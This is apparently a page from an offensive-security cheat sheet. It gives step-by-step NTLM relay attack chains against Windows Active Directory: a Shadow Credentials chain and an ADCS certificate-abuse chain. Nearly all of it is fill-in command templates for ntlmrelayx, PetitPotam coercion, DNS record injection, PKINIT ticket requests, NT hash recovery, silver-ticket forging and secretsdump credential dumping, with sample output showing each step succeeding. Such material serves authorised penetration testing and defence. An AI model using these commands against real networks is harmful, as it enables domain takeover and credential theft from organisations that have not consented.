---
title: "NTLM Relay Attack"
tags: ["Active Directory", "NTLM Relay Attack", "ADCS", "Impacket", "LDAP", "NTLM", "NTLM Replay", "Pass-The-Hash", "Petitpotam", "Pkinit", "Shadow Credential", "Ticket Granting Ticket", "WebDAV", "Windows"]
---

{{< filter_buttons >}}

### Shadow Credential

#### 1. Redirect Traffic (Pivoting Node) \[Optional\]

```console
# Upload socat.zip and unzip
Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force
```

```console {class="sample-code"}
PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force
```

```console
.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80
```

```console {class="sample-code"}
PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
the public mailing list cygwin@cygwin.com
```

<small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>

#### 2. Enable WebClient Service (Windows Target) \[Optional\]

```console
# Local Linux
sudo responder -I tun0
```

```console
# Windows target
net use x: http://<LOCAL_IP>/
```

```console
# Check
./GetWebDAVStatus.exe <TARGET>
```

```console {class="sample-code"}
./GetWebDAVStatus.exe 10.10.254.230
[+] WebClient service is active on 10.10.254.230
```

<small>*Ref: [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)*</small>

#### 3. Add a DNS Entry in Trusted Zone

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console {class="password"}
# Password
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ntlm"}
# NTLM
python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Import module
. ./Powermad.ps1
```

```console
# Add new entry
New-ADIDNSNode -Tombstone -Verbose -Node * -Data <LOCAL_IP>
```

{{< /tabcontent >}}

#### 4. Start Responder Listener (Local Linux)

```console
# Modify /etc/responder/Responder.conf
; Servers to start
SMB      = Off
HTTP     = Off
HTTPS    = Off
LDAP     = Off
```

<br>

```console
sudo responder -I tun0 -w -d -v
```

#### 5. Start NTLM Relay Server (Local Linux)

```console
# Get latest impacket
python3 examples/ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --adcs --shadow-credentials --shadow-target '<TARGET_HOSTNAME>$' 
```

```console {class="sample-code"}
$ python3 examples/ntlmrelayx.py -t ldaps://10.10.254.229 -smb2support --adcs --shadow-credentials --shadow-target 'ws01$'
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

#### 6. Coerce Authentication

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console {class="password"}
# Password
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -d example.com -k --use-kcache --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
./SpoolSample.exe <TARGET> <SUBDOMAIN>@80/test
```

{{< /tabcontent >}}

#### 7. Request TGT Using pfx File (Local Linux)

```console
# Cert-based Kerberos
python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_PASSWORD> -dc-ip <DC_IP>
```

```console {class="sample-code"}
python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
2024-04-02 16:17:58,897 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-04-02 16:17:58,907 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-04-02 16:18:07,594 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-04-02 16:18:07,594 minikerberos INFO     7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
2024-04-02 16:18:07,597 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```console
# Check
nxc smb <DC> --use-kcache
```

<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

#### 8. Get NTLM Hash (Local Linux)

```console
# Pass-the-ticket
export KRB5CCNAME='<TARGET_HOSTNAME>.ccache'
```

```console
# Ticket-based Kerberos
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```

```console {class="sample-code"}
$ python3 getnthash.py example.com/'ms01$' -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
59920e994636168744039017dcf49e54
```

#### 9. Forge a Silver Ticket

```console
# NTLM
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn <SPN> administrator
```

#### 10. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME='administrator.ccache'
```

```console
# Secrets dump
impacket-secretsdump -k -no-pass <TARGET>
```

---

### Abusing Active Directory Certificate Services (ADCS)

#### 1. Run socat to Redirect Traffic (Inside Pivoting Node) \[Optional\]

```console
./socat tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 &
```

#### 2. DNS Poisoning

```console
python3 examples/ntlmrelayx.py -t "ldap://<DC_IP>" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

#### 3. Add hostnames to /etc/hosts

```console
<DC_IP> <DC_HOSTNAME>.<DOMAIN>
<TARGET_IP> <TARGET_HOSTNAME>.<DOMAIN>
```

#### 4. Relay NTLM to ADCS

```console
python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --adcs -v '<TARGET_HOSTNAME>$'
```

#### 5. Run PetitPotam

```console {class="password"}
# Password
python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

```console {class="ntlm"}
# NTLM
python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -hashes :<HASH> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -k -no-pass -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

#### 6. Request a Ticket Using pfx file

```console
# Cert-based Kerberos
python3 gettgtpkinit.py -cert-pfx '<TARGET_HOSTNAME>$.pfx' '<DOMAIN>/<TARGET_HOSTNAME>$' '<TARGET_HOSTNAME>$.ccache'
```

#### 7. Get NTLM Hash

```console
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```